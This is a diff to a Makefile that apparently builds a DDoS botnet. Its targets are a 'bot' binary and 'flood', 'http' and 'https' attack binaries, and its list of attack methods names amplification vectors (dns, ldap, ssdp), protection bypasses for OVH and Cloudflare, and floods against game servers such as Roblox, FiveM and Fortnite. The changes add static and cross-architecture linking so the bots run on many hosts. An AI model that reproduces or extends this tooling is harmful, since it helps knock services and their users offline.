@@ -1,12 +1,12 @@
 CXX      ?= g++
-CXXFLAGS  = -Os -s -fno-exceptions -fno-rtti -ffunction-sections -fdata-sections -Wl,--gc-sections -pthread
+CXXFLAGS  = -Os -s -fno-exceptions -fno-rtti -ffunction-sections -fdata-sections -Wl,--gc-sections -pthread -static-libstdc++ -static-libgcc
 ZIG       ?= /tmp/zig-linux-x86_64-0.13.0/zig
 
 METHODS = dns udp ldap ssdp home udpbypass tcp socket ovh tcpmix tcpbypass ack \
           game rainbow rocket roblox fivem pubg fortnite warthunder counter samp \
           subnet icmp http https httpx rapidflood tls tlsx bypass browser cache cloudflare
 
-all: bot http https flood multiarch symlinks
+all: bot http flood multiarch symlinks
 
 bot: bot.cpp
 	@if [ -x "$(ZIG)" ]; then \
@@ -23,13 +23,17 @@ http: http.cpp
 	fi
 
 https: https.cpp
-	$(CXX) $(CXXFLAGS) -march=x86-64 -mtune=generic -o https https.cpp -lssl -lcrypto
+	@if [ -x "$(ZIG)" ]; then \
+		ln -sf flood https; \
+	else \
+		$(CXX) $(CXXFLAGS) -march=x86-64 -mtune=generic -static-libstdc++ -static-libgcc -o https https.cpp -lssl -lcrypto; \
+	fi
 
 flood: flood.cpp
 	@if [ -x "$(ZIG)" ]; then \
 		$(ZIG) c++ -target x86_64-linux-musl -mcpu=x86_64 -static -Os -s -fno-exceptions -fno-rtti -pthread -DNO_SSL flood.cpp -o flood; \
 	else \
-		$(CXX) $(CXXFLAGS) -march=x86-64 -mtune=generic -o flood flood.cpp -lssl -lcrypto; \
+		$(CXX) $(CXXFLAGS) -march=x86-64 -mtune=generic -static -DNO_SSL -o flood flood.cpp; \
 	fi
 
 multiarch:
